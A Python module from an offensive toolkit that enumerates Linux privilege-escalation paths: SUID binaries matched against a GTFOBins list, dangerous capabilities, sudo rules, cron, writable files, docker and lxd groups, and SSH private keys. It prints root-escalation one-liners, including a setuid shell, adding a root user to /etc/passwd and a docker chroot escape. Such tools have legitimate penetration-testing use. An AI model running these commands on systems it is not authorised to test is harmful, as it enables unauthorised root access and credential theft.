"""
Linux Privilege Escalation Checker
Automated enumeration for common Linux privesc vectors
"""

import subprocess
import os
import re
from typing import List, Dict, Optional, Tuple
from datetime import datetime
from core.module_base import ModuleBase, ModuleType, Platform


class LinuxPrivesc(ModuleBase):
    """
    Linux privilege escalation checker:
    - SUID/SGID binaries
    - Capabilities
    - Sudo permissions
    - Cron jobs
    - Writable files/directories
    - Kernel version
    - Password files
    - Docker/LXC membership
    - SSH keys
    """

    # GTFOBins SUID exploitable binaries
    GTFOBINS_SUID = {
        "aa-exec", "ab", "agetty", "alpine", "ar", "arj", "arp", "as", "ascii-xfr",
        "ash", "aspell", "atobm", "awk", "base32", "base64", "basenc", "bash",
        "bc", "bridge", "busctl", "busybox", "bzip2", "cabal", "capsh", "cat",
        "chmod", "choom", "chown", "chroot", "clamscan", "cmp", "column",
        "comm", "cp", "cpio", "cpulimit", "csh", "csplit", "csvtool", "cupsfilter",
        "curl", "cut", "dash", "date", "dd", "debugfs", "dialog", "diff", "dig",
        "distcc", "dmsetup", "docker", "dosbox", "ed", "efax", "elvish", "emacs",
        "env", "eqn", "espeak", "expand", "expect", "file", "find", "fish",
        "flock", "fmt", "fold", "gawk", "gcore", "gdb", "genisoimage", "gimp",
        "git", "grep", "gtester", "gzip", "hd", "head", "hexdump", "highlight",
        "hping3", "iconv", "install", "ionice", "ip", "jjs", "join", "jq",
        "jrunscript", "julia", "ksh", "ksshell", "kubectl", "ld.so", "less",
        "logsave", "look", "lua", "make", "mawk", "more", "msgattrib", "msgcat",
        "msgconv", "msgfilter", "msgmerge", "msguniq", "multitime", "mv", "nasm",
        "nawk", "nc", "nft", "nice", "nl", "nm", "nmap", "node", "nohup", "ntpdate",
        "od", "openssl", "openvpn", "paste", "perf", "perl", "pg", "php", "pic",
        "pico", "pidstat", "pr", "ptx", "python", "python2", "python3", "rake",
        "readelf", "restic", "rev", "rlwrap", "rsync", "ruby", "run-parts",
        "rview", "rvim", "sash", "scanmem", "sed", "setarch", "shuf", "slsh",
        "socat", "sort", "split", "ssh-keygen", "ssh-keyscan", "sshpass", "start-stop-daemon",
        "stdbuf", "strace", "strings", "sysctl", "tac", "tail", "tar", "taskset",
        "tbl", "tclsh", "tee", "tftp", "tic", "timeout", "troff", "ul", "unexpand",
        "uniq", "unshare", "update-alternatives", "uudecode", "uuencode", "valgrind",
        "vi", "view", "vigr", "vim", "vimdiff", "vipw", "watch", "wc", "wget",
        "whiptail", "xargs", "xdotool", "xmodmap", "xmore", "xxd", "xz", "yash",
        "zsh", "zsoelim"
    }

    # Capabilities that can be exploited
    DANGEROUS_CAPS = {
        "cap_setuid": "Can change UID - get root shell",
        "cap_setgid": "Can change GID - escalate groups",
        "cap_dac_override": "Bypass file read/write/execute checks",
        "cap_dac_read_search": "Bypass read checks - read any file",
        "cap_chown": "Can change file ownership",
        "cap_fowner": "Bypass permission checks for file owner",
        "cap_sys_admin": "Mount filesystems, trace processes",
        "cap_sys_ptrace": "Trace any process - inject code",
        "cap_net_admin": "Network admin - man in middle",
        "cap_net_raw": "Use raw sockets",
    }

    def __init__(self):
        super().__init__()
        self.name = "linux_privesc"
        self.description = "Linux privilege escalation enumeration"
        self.author = "UwU Toolkit"
        self.module_type = ModuleType.POST
        self.platform = Platform.LINUX
        self.tags = ["privesc", "linux", "enumeration", "post-exploitation"]
        self.references = [
            "https://gtfobins.github.io/",
            "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/",
        ]

        # Register options
        self.register_option("SESSION", "Shell session ID (for remote)", default="")
        self.register_option("OUTPUT", "Save results to file", default="")
        self.register_option("THOROUGH", "Run thorough enumeration (slower)",
                           default="no", choices=["yes", "no"])

    def run(self) -> bool:
        session_id = self.get_option("SESSION")
        output_file = self.get_option("OUTPUT")
        thorough = self.get_option("THOROUGH") == "yes"

        self.findings: List[Tuple[str, str, str]] = []  # (severity, category, detail)

        self.print_line()
        self.print_good("=" * 60)
        self.print_good("  Linux Privilege Escalation Checker")
        self.print_good("=" * 60)
        self.print_line()

        # System Info
        self._check_system_info()

        # SUID/SGID
        self._check_suid()

        # Capabilities
        self._check_capabilities()

        # Sudo
        self._check_sudo()

        # Cron
        self._check_cron()

        # Writable paths
        self._check_writable()

        # Password files
        self._check_passwd_files()

        # Docker/LXC
        self._check_containers()

        # SSH
        self._check_ssh()

        if thorough:
            self._thorough_checks()

        # Summary
        self._print_summary()

        # Save if requested
        if output_file:
            self._save_findings(output_file)

        return True

    def _run_cmd(self, cmd: str, timeout: int = 30) -> str:
        """Run command and return output"""
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True,
                                   text=True, timeout=timeout)
            return result.stdout.strip()
        except:
            return ""

    def _check_system_info(self) -> None:
        """Check system information"""
        self.print_good("[System Information]")
        self.print_line("-" * 40)

        # Kernel version
        kernel = self._run_cmd("uname -r")
        self.print_status(f"Kernel: {kernel}")

        # Check for known vulnerable kernels
        if any(x in kernel for x in ["2.6", "3.0", "3.1", "3.2", "4.4.0-21", "4.4.0-31"]):
            self.print_warning("  Potentially vulnerable kernel version!")
            self.findings.append(("HIGH", "KERNEL", f"Old kernel: {kernel}"))

        # Distribution
        distro = self._run_cmd("cat /etc/*release 2>/dev/null | head -1")
        self.print_status(f"Distribution: {distro}")

        # Current user
        user = self._run_cmd("id")
        self.print_status(f"User: {user}")

        if "uid=0" in user:
            self.print_good("  Already root!")
            return

        self.print_line()

    def _check_suid(self) -> None:
        """Check for SUID/SGID binaries"""
        self.print_good("[SUID/SGID Binaries]")
        self.print_line("-" * 40)

        suid_output = self._run_cmd("find / -perm -4000 -type f 2>/dev/null")
        sgid_output = self._run_cmd("find / -perm -2000 -type f 2>/dev/null")

        suid_bins = set(suid_output.split('\n')) if suid_output else set()
        sgid_bins = set(sgid_output.split('\n')) if sgid_output else set()

        exploitable = []

        for binary in suid_bins:
            if not binary:
                continue
            name = os.path.basename(binary)
            if name in self.GTFOBINS_SUID:
                exploitable.append(binary)
                self.print_warning(f"  EXPLOITABLE: {binary}")
                self.findings.append(("CRITICAL", "SUID", f"GTFOBins SUID: {binary}"))

        self.print_status(f"Total SUID: {len(suid_bins)}, SGID: {len(sgid_bins)}")
        self.print_status(f"Exploitable: {len(exploitable)}")

        if exploitable:
            self.print_line()
            self.print_warning("Check GTFOBins for exploitation:")
            self.print_line("  https://gtfobins.github.io/#+suid")

        self.print_line()

    def _check_capabilities(self) -> None:
        """Check file capabilities"""
        self.print_good("[File Capabilities]")
        self.print_line("-" * 40)

        caps_output = self._run_cmd("getcap -r / 2>/dev/null")

        if not caps_output:
            self.print_status("No interesting capabilities found")
            self.print_line()
            return

        dangerous_found = []

        for line in caps_output.split('\n'):
            if not line:
                continue

            self.print_status(f"  {line}")

            # Check for dangerous capabilities
            for cap, desc in self.DANGEROUS_CAPS.items():
                if cap in line.lower():
                    dangerous_found.append((line, cap, desc))
                    self.print_warning(f"    ^ DANGEROUS: {desc}")
                    self.findings.append(("CRITICAL", "CAPABILITY", f"{cap}: {line}"))

        if dangerous_found:
            self.print_line()
            self.print_warning("Exploitation examples:")
            for binary, cap, _ in dangerous_found:
                if "cap_setuid" in cap:
                    self.print_line(f"  {binary.split()[0]} -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'")

        self.print_line()

    def _check_sudo(self) -> None:
        """Check sudo permissions"""
        self.print_good("[Sudo Permissions]")
        self.print_line("-" * 40)

        # Try sudo -l (may require password)
        sudo_output = self._run_cmd("sudo -l 2>/dev/null | grep -v 'password'")

        if not sudo_output:
            self.print_status("Cannot check sudo (password required or not installed)")
            self.print_line()
            return

        self.print_status("Sudo permissions:")
        for line in sudo_output.split('\n'):
            if line.strip():
                self.print_line(f"  {line}")

                # Check for NOPASSWD
                if "NOPASSWD" in line:
                    self.print_warning("    ^ NOPASSWD - No password needed!")

                    # Check for dangerous commands
                    if "(ALL)" in line or "(root)" in line:
                        self.findings.append(("CRITICAL", "SUDO", f"NOPASSWD root: {line}"))

                    # Check for GTFOBins
                    for binary in self.GTFOBINS_SUID:
                        if binary in line:
                            self.print_warning(f"    ^ GTFOBins: {binary}")
                            self.findings.append(("CRITICAL", "SUDO", f"GTFOBins sudo: {binary}"))

        self.print_line()

    def _check_cron(self) -> None:
        """Check cron jobs for privesc opportunities"""
        self.print_good("[Cron Jobs]")
        self.print_line("-" * 40)

        # System cron
        crontab = self._run_cmd("cat /etc/crontab 2>/dev/null")
        crond = self._run_cmd("ls -la /etc/cron.d/ 2>/dev/null")
        cron_daily = self._run_cmd("ls -la /etc/cron.daily/ 2>/dev/null")

        if crontab:
            self.print_status("/etc/crontab entries:")
            for line in crontab.split('\n'):
                if line and not line.startswith('#') and line.strip():
                    self.print_line(f"  {line}")

                    # Check if script is writable
                    parts = line.split()
                    if len(parts) >= 7:
                        script = parts[6] if not parts[6].startswith('root') else parts[-1]
                        if os.path.exists(script):
                            writable = self._run_cmd(f"test -w {script} && echo 'writable'")
                            if writable:
                                self.print_warning(f"    ^ WRITABLE: {script}")
                                self.findings.append(("HIGH", "CRON", f"Writable cron script: {script}"))

        self.print_line()

    def _check_writable(self) -> None:
        """Check for writable sensitive files/directories"""
        self.print_good("[Writable Files/Directories]")
        self.print_line("-" * 40)

        sensitive_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/sudoers",
            "/etc/crontab",
            "/root",
            "/root/.ssh",
        ]

        for path in sensitive_paths:
            writable = self._run_cmd(f"test -w {path} 2>/dev/null && echo 'writable'")
            if writable:
                self.print_warning(f"  WRITABLE: {path}")
                self.findings.append(("CRITICAL", "WRITABLE", path))

        # Check world-writable in PATH
        path_dirs = os.environ.get('PATH', '').split(':')
        for d in path_dirs:
            if d and os.path.exists(d):
                writable = self._run_cmd(f"test -w {d} 2>/dev/null && echo 'writable'")
                if writable:
                    self.print_warning(f"  PATH writable: {d}")
                    self.findings.append(("HIGH", "PATH_HIJACK", d))

        self.print_line()

    def _check_passwd_files(self) -> None:
        """Check password files"""
        self.print_good("[Password Files]")
        self.print_line("-" * 40)

        # Check if /etc/passwd is writable
        passwd_writable = self._run_cmd("test -w /etc/passwd && echo 'yes'")
        if passwd_writable:
            self.print_warning("  /etc/passwd is WRITABLE!")
            self.print_line("  Add user: echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd")
            self.findings.append(("CRITICAL", "PASSWD", "/etc/passwd writable"))

        # Check for password hashes in passwd
        passwd = self._run_cmd("cat /etc/passwd 2>/dev/null | grep -v ':x:'")
        if passwd:
            self.print_warning("  Password hashes in /etc/passwd:")
            self.print_line(f"  {passwd}")
            self.findings.append(("HIGH", "PASSWD", "Hashes in passwd file"))

        self.print_line()

    def _check_containers(self) -> None:
        """Check for Docker/LXC access"""
        self.print_good("[Container Access]")
        self.print_line("-" * 40)

        # Docker group
        groups = self._run_cmd("id")
        if "docker" in groups:
            self.print_warning("  User is in docker group!")
            self.print_line("  Escalate: docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
            self.findings.append(("CRITICAL", "DOCKER", "User in docker group"))

        if "lxd" in groups or "lxc" in groups:
            self.print_warning("  User is in lxd/lxc group!")
            self.findings.append(("CRITICAL", "LXD", "User in lxd group"))

        # Docker socket
        if os.path.exists("/var/run/docker.sock"):
            socket_writable = self._run_cmd("test -w /var/run/docker.sock && echo 'yes'")
            if socket_writable:
                self.print_warning("  Docker socket is writable!")
                self.findings.append(("CRITICAL", "DOCKER", "Docker socket writable"))

        self.print_line()

    def _check_ssh(self) -> None:
        """Check SSH configurations"""
        self.print_good("[SSH]")
        self.print_line("-" * 40)

        # Look for SSH keys
        home = os.path.expanduser("~")
        ssh_keys = self._run_cmd(f"find /home /root -name 'id_rsa' -o -name 'id_dsa' 2>/dev/null")

        if ssh_keys:
            self.print_status("SSH private keys found:")
            for key in ssh_keys.split('\n'):
                if key:
                    self.print_warning(f"  {key}")
                    self.findings.append(("HIGH", "SSH", f"Private key: {key}"))

        # Check authorized_keys
        auth_keys = self._run_cmd("find /home /root -name 'authorized_keys' 2>/dev/null")
        if auth_keys:
            self.print_status("Authorized keys files:")
            for f in auth_keys.split('\n'):
                if f:
                    writable = self._run_cmd(f"test -w {f} && echo 'yes'")
                    if writable:
                        self.print_warning(f"  WRITABLE: {f}")
                        self.findings.append(("HIGH", "SSH", f"Writable authorized_keys: {f}"))

        self.print_line()

    def _thorough_checks(self) -> None:
        """Additional thorough checks"""
        self.print_good("[Thorough Checks]")
        self.print_line("-" * 40)

        # Process running as root
        self.print_status("Processes running as root (sample):")
        procs = self._run_cmd("ps aux | grep ^root | head -10")
        self.print_line(procs)

        # Network connections
        self.print_line()
        self.print_status("Listening ports:")
        ports = self._run_cmd("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null")
        self.print_line(ports)

        self.print_line()

    def _print_summary(self) -> None:
        """Print findings summary"""
        self.print_line()
        self.print_good("=" * 60)
        self.print_good("  Privilege Escalation Summary")
        self.print_good("=" * 60)

        critical = [f for f in self.findings if f[0] == "CRITICAL"]
        high = [f for f in self.findings if f[0] == "HIGH"]

        self.print_status(f"Critical findings: {len(critical)}")
        self.print_status(f"High findings: {len(high)}")

        if critical:
            self.print_line()
            self.print_warning("CRITICAL - Likely paths to root:")
            for sev, cat, detail in critical:
                self.print_line(f"  [{cat}] {detail}")

        if high:
            self.print_line()
            self.print_warning("HIGH - Potential escalation vectors:")
            for sev, cat, detail in high:
                self.print_line(f"  [{cat}] {detail}")

    def _save_findings(self, filename: str) -> None:
        """Save findings to file"""
        try:
            with open(filename, 'w') as f:
                f.write("Linux Privilege Escalation Findings\n")
                f.write("=" * 60 + "\n\n")

                for sev, cat, detail in self.findings:
                    f.write(f"[{sev}] [{cat}] {detail}\n")

            self.print_good(f"Findings saved to: {filename}")
        except Exception as e:
            self.print_error(f"Failed to save: {e}")

    def check(self) -> bool:
        """Check if running on Linux"""
        import platform
        if platform.system() != "Linux":
            self.print_error("This module requires Linux")
            return False
        return True
